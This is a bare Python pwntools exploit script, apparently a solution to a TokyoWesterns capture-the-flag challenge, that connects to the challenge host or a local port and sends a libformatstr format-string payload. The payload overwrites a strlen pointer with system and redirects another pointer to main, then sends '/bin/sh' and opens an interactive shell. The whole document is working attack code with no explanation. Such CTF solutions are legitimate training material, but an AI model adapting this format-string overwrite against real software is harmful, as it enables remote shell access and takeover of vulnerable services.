import sys
from libformatstr import FormatStr
from pwn import *

pr=0x8049934
nao=0x8048742
main=0x80485ed
strlen=0x8049a54

local=len(sys.argv)==1
if not local:
	s=remote('pwn2.chal.ctf.westerns.tokyo',16317)
else:
	s=remote('127.0.0.1',5000)
print s.recvline()
print s.recv(30)

p1=FormatStr()
p1[pr]=main
system=0x08048496
p1[strlen]=system
offset=12
padding=2
round1=p1.payload(offset,padding,18)
print round1
s.sendline(round1)
log.info("round1 sent!")
s.recvline(timeout=10)
s.sendline("/bin/sh")
s.interactive()
s.close()